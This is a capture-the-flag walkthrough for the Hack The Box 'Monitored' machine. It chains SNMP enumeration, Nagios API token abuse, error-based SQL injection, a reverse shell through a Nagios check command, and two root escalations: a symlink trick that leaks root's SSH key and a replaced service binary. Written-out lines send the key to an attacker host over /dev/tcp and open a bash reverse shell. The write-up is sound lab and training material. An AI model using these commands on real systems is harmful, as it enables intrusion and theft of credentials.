### NMAP

```
sudo nmap -sC -sV -vv -oN monitored-nmap 10.10.11.248
```

![[HackTheBox/Linux/attachments/Pasted image 20250505204634.png]]
- 22, 80, 389, 443

Add `monitored.htb` & `nagios.monitored.htb` to `/etc/hosts`

### NMAP - UDP Ports

```
sudo nmap -v -sU 10.10.11.248 -oN udp-monitored-nmap
```
### Check Website 

There's a login
![[HackTheBox/Linux/attachments/Pasted image 20250505205026.png]]

#### Virtual Host Brute Force with GoBuster
Because site is already using nagios.monitored.htb 

```
gobuster vhost -k -u https://monitored.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
```

Result (nothing)

![[HackTheBox/Linux/attachments/Pasted image 20250505210348.png]]

### SNMP Enumeration 

```
snmpwalk -v2c -c public 10.10.11.248
```

Result
![[HackTheBox/Linux/attachments/Pasted image 20250505210547.png]]

Edit snmp conf to make this output easier to read

```
sudo vim /etc/snmp/snmp.conf
```

Uncomment the mibdirs line

![[HackTheBox/Linux/attachments/Pasted image 20250505210822.png]]

Need to install some snmp packages as well 

Get the exact name with 

```
apt search snmp-mibs
```

```
sudo apt install snmp-mibs-downloader
```

![[HackTheBox/Linux/attachments/Pasted image 20250505211008.png]]

Then re-run the snmpwalk with -m all


```
snmpwalk -v2c -c public 10.10.11.248 -m all
```

Faster method is using snmpbulkwalk

```
snmpbulkwalk -v2c -c public 10.10.11.248 -m all | tee snmp.out
```

Then search for 'nagios' within snmp.out 

```
grep nagios snmp.out
```

![[HackTheBox/Linux/attachments/Pasted image 20250505211732.png]]

Let's grep on `SWRun` and `988`

```
grep 'SWRun' snmp.out | grep 988
```

![[HackTheBox/Linux/attachments/Pasted image 20250505212033.png]]

Check what's running on the box 

```
grep SWRunName snmp.out
```

![[HackTheBox/Linux/attachments/Pasted image 20250505212254.png]]
- curious about sleep (2221) and sh (2211)

Here is sh
```
grep SWRun snmp.out | grep 2211
```

![[HackTheBox/Linux/attachments/Pasted image 20250505212431.png]]

Here is sleep 
```
grep SWRun snmp.out | grep 2221
```

![[HackTheBox/Linux/attachments/Pasted image 20250505212527.png]]
- not interesting 

Here is bash
```
grep SWRun snmp.out | grep 1432
```

![[HackTheBox/Linux/attachments/Pasted image 20250505212643.png]]
- see a script running - `check_host.sh` svc and probably a password `XjH7V..`

Attempt to login to web app with svc and the `XjH7V..` password string but it doesn't work

![[HackTheBox/Linux/attachments/Pasted image 20250505212849.png]]

Because we have "svc" which is a service -> try to login via API. 

Google "nagios api login" and find example logins with API token

![[HackTheBox/Linux/attachments/Pasted image 20250505213051.png]]

Let's try to hit the /nagiosxi/api/v1/authenticate

Intercept login request with Burp and send it to Repeater 

Request 

![[HackTheBox/Linux/attachments/Pasted image 20250505213243.png]]

Delete everything except for username and password

![[HackTheBox/Linux/attachments/Pasted image 20250505213336.png]]

Add the /nagiosxi/api/v1/authenticate to the URL and send the request 

![[HackTheBox/Linux/attachments/Pasted image 20250505213443.png]]

Response

![[HackTheBox/Linux/attachments/Pasted image 20250505213508.png]]
- we get a token! 🪙

Let's see if this token works. 

Disable intercept proxy and navigate using the URL in the browser

![[HackTheBox/Linux/attachments/Pasted image 20250505213657.png]]

This logs us in as the svc user

![[HackTheBox/Linux/attachments/Pasted image 20250505213728.png]]
- nagios is an infrastructure monitoring tool
- nagios version - 5.11

### Search for Nagios version exploit

Google "Nagios XI version 5.11.0 exploit" and discover SQL injection vulnerability PoC

[Medium Blog Link](https://medium.com/@n1ghtcr4wl3r/nagios-xi-vulnerability-cve-2023-40931-sql-injection-in-banner-ace8258c5567)

Here is malicious payload example 
![[HackTheBox/Linux/attachments/Pasted image 20250505214215.png]]

### Manual Error-Based SQLi 
#### Using EXTRACTVALUE
Craft Burp request and discover error based SQLi 

![[HackTheBox/Linux/attachments/Pasted image 20250505214352.png]]

Response
![[HackTheBox/Linux/attachments/Pasted image 20250505214412.png]]

Craft request using EXTRACTVALUE to get db version 
![[HackTheBox/Linux/attachments/Pasted image 20250505214602.png]]

Response
![[HackTheBox/Linux/attachments/Pasted image 20250505214625.png]]

Google information_schema mysql and find the [table reference ](https://dev.mysql.com/doc/refman/8.4/en/information-schema-table-reference.html)

SQLi Burp Request for information schema

![[HackTheBox/Linux/attachments/Pasted image 20250505215740.png]]

Response
![[HackTheBox/Linux/attachments/Pasted image 20250505215756.png]]

Now we can group concat to get the database names
![[HackTheBox/Linux/attachments/Pasted image 20250505215905.png]]

Result
![[HackTheBox/Linux/attachments/Pasted image 20250505215926.png]]

Get columns of the nagios database request 

![[HackTheBox/Linux/attachments/Pasted image 20250505220555.png]]

Response 
![[HackTheBox/Linux/attachments/Pasted image 20250505220615.png]]
- get some data but limited to number of characters

Get table name (one row at a time) by toggling LIMIT n,1 Request
![[HackTheBox/Linux/attachments/Pasted image 20250505221117.png]]

Response
![[HackTheBox/Linux/attachments/Pasted image 20250505221138.png]]

Send this Burp request to Intruder and add the payload marker 

![[HackTheBox/Linux/attachments/Pasted image 20250505221303.png]]

Then go to payloads and change the type to Numbers and select the range of 0 to 30
![[HackTheBox/Linux/attachments/Pasted image 20250505221412.png]]

Start the attack - lots of output...

Refining query with a pipe "|" 


![[HackTheBox/Linux/attachments/Pasted image 20250506000204.png]]

Re-start the attack and look at the response 
![[HackTheBox/Linux/attachments/Pasted image 20250506000301.png]]
- Notice | at the beginning and ' at the end of the table name

Navigate to settings > Grep - Extract > Add > Start after expression: | > End at delimiter: ' > OK

![[HackTheBox/Linux/attachments/Pasted image 20250506000515.png]]

This is listing all of the table names :)

![[HackTheBox/Linux/attachments/Pasted image 20250506000629.png]]

Take the xi_users table and use the same technique to enumerate columns with Burp

Burp request 
![[HackTheBox/Linux/attachments/Pasted image 20250506000816.png]]

Burp response 
![[HackTheBox/Linux/attachments/Pasted image 20250506000836.png]]

Grab a username from the xi_users table after enumerating the columns
![[HackTheBox/Linux/attachments/Pasted image 20250506001119.png]]

Response
![[HackTheBox/Linux/attachments/Pasted image 20250506001141.png]]
- `nagiosadmin`
- `svc`

Grab password 
![[HackTheBox/Linux/attachments/Pasted image 20250506001258.png]]

Response
![[HackTheBox/Linux/attachments/Pasted image 20250506001315.png]]

Grab api key
![[HackTheBox/Linux/attachments/Pasted image 20250506001354.png]]

Response
![[HackTheBox/Linux/attachments/Pasted image 20250506001409.png]]

Because the password and api keys are truncated -> construct sql query to get the second part of both 

Grab first part of api key 
![[HackTheBox/Linux/attachments/Pasted image 20250506001812.png]]
Response
![[HackTheBox/Linux/attachments/Pasted image 20250506001828.png]]

Grab second part of api key 
![[HackTheBox/Linux/attachments/Pasted image 20250506001938.png]]

Response
![[HackTheBox/Linux/attachments/Pasted image 20250506001953.png]]

Grab third part of api key 
![[HackTheBox/Linux/attachments/Pasted image 20250506002033.png]]

Response
![[HackTheBox/Linux/attachments/Pasted image 20250506002049.png]]

Final api key for nagiosadmin
![[HackTheBox/Linux/attachments/Pasted image 20250506002119.png]]

### Logging in to Nagios with API key

Google "nagios authenticate api key" and find an exploitdb script that creates a new user 

![[HackTheBox/Linux/attachments/Pasted image 20250506003743.png]]

Here is the Burp request with the API key we found in the database and all the parameters needed to create new admin user
![[HackTheBox/Linux/attachments/Pasted image 20250506003944.png]]

Response
![[HackTheBox/Linux/attachments/Pasted image 20250506004007.png]]
- success

Login to the webapp as ippsec, an admin user

![[HackTheBox/Linux/attachments/Pasted image 20250506004105.png]]

### Create nagios check to send reverse shell 

Go to Configure > Core Config Manager
![[HackTheBox/Linux/attachments/Pasted image 20250506004234.png]]

Click Commands
![[HackTheBox/Linux/attachments/Pasted image 20250506004256.png]]

Add new command to get reverse shell, save, apply config
![[HackTheBox/Linux/attachments/Pasted image 20250506004358.png]]

Now go to Navigation > Configure > Core config manager > Services
![[HackTheBox/Linux/attachments/Pasted image 20250506004538.png]]

Add new service with the reverse shell command 
![[HackTheBox/Linux/attachments/Pasted image 20250506004628.png]]

Set up nc listener 

Run Check Command 
![[HackTheBox/Linux/attachments/Pasted image 20250506004705.png]]

Catch reverse shell 
![[HackTheBox/Linux/attachments/Pasted image 20250506004733.png]]

❗initial access as nagios user❗

### Look for credentials

Find the Nagios config because we know MySQL is on the box.

Found default password `nagiosxi` in `/usr/local/nagiosxi/etc` (not useful)

![[HackTheBox/Linux/attachments/Pasted image 20250506193205.png]]

### Sudo -l

Checking `sudo -l` and we have a lot of rules
![[HackTheBox/Linux/attachments/Pasted image 20250506193313.png]]

Checking out the `getprofile.sh` script

This script is zipping a bunch of files which may mean it is vulnerable to SymLink attack

![[HackTheBox/Linux/attachments/Pasted image 20250506193545.png]]

Let's add a symlink in the middle of this script logic. 

First, creating ssh key in nagios `.ssh` folder

On Kali box create the ssh key 

```
ssh-keygen -f nagios
```

Copy the public key to the clipboard 

```
cat nagios.pub |xclip -selection clipboard
```

![[HackTheBox/Linux/attachments/Pasted image 20250506193822.png]]

In nagios' .ssh directory, create a file called `authorized_keys` and paste kali's ssh public key in there

![[HackTheBox/Linux/attachments/Pasted image 20250506194008.png]]

Now ssh in as nagios user 

```
ssh -i nagios nagios@10.10.11.248
```

Two shells

![[HackTheBox/Linux/attachments/Pasted image 20250506194148.png]]

Return to the getprofile.sh script and find a directory that we can write to and that is being copied somewhere else 

Trying this file because it's owned by the nagios user 

![[HackTheBox/Linux/attachments/Pasted image 20250506194607.png]]

Now that we have permissions to write to this file. Rename it. Then give the root id_rsa key the same name as this file.

Move the original file
```
mv cmdsubsys.log cmdsubsys.log~
```

Give root's ssh key this file's name
```
ln -s /root/.ssh/id_rsa cmdsubsys.log
```

Now we can see the cmdsubsys.log file is pointed to /root/.ssh/id_rsa

![[HackTheBox/Linux/attachments/Pasted image 20250506195043.png]]

Now execute the getprofile.sh script as sudo

![[HackTheBox/Linux/attachments/Pasted image 20250506195119.png]]

Now find out where this profile is saved 

![[HackTheBox/Linux/attachments/Pasted image 20250506195226.png]]
- profile.zip

Move this zip to /tmp

```
mv profile.zip /tmp
```

Unzip the profile.zip

```
unzip profile.zip
```

Find the cmdsubsys.txt file 

![[HackTheBox/Linux/attachments/Pasted image 20250506195658.png]]

Here's the file 

![[HackTheBox/Linux/attachments/Pasted image 20250506195729.png]]

And we have root's ssh key

![[HackTheBox/Linux/attachments/Pasted image 20250506195759.png]]

Login as root

```
nc lvnp 9001 > root
```

![[HackTheBox/Linux/attachments/Pasted image 20250506195902.png]]

Cat the cmdsubsys.txt file with root's ssh key and send the key over to kali box

```
cat cmdsubsys.txt > /dev/tcp/10.10.14.8/9001
```

Change the perms of the private key 

```
chmod 600 root
```

![[HackTheBox/Linux/attachments/Pasted image 20250506200134.png]]

SSH in as root user

```
ssh -i root root@10.10.11.248
```

![[HackTheBox/Linux/attachments/Pasted image 20250506200224.png]]

⭐ Got ROOT ⭐

![[HackTheBox/Linux/attachments/Pasted image 20250506200253.png]]

### Alternate Priv Esc - Replace Service Binary
Overwriting the Nagios Binary than using Sudo to restart the service to get a root shell

Run `sudo -l`

![[HackTheBox/Linux/attachments/Pasted image 20250506205947.png]]
- Notice `manage_services.sh`

Check out `manage_services.sh`

![[HackTheBox/Linux/attachments/Pasted image 20250506210220.png]]
- This lets us restart nagios

Determine that nagios binary is owned by us 
```
stat /usr/local/nagios/bin/nagios
```

![[HackTheBox/Linux/attachments/Pasted image 20250506210424.png]]

We can replace the `/usr/local/nagios/bin/nagios` service binary 

Rename the `nagios` binary to `nagios~`

```
mv nagios nagios~
```

![[HackTheBox/Linux/attachments/Pasted image 20250506210713.png]]

Create a new file called `nagios` and paste in reverse shell

```
#!/bin/bash

bash -i >& /dev/tcp/10.10.14.8/9001 0>&1'
```

![[HackTheBox/Linux/attachments/Pasted image 20250506210835.png]]

Make it executable
```
chmod +x nagios
```

Set up nc listener 

```
nc -lvnp 9001
```

Run the script really quick to make sure there isn't a typo 

```
./nagios
```

![[HackTheBox/Linux/attachments/Pasted image 20250506211027.png]]

Restart the nagios service with sudo permissions

![[HackTheBox/Linux/attachments/Pasted image 20250506211213.png]]

Catch the shell as root again :)

![[HackTheBox/Linux/attachments/Pasted image 20250506211235.png]]
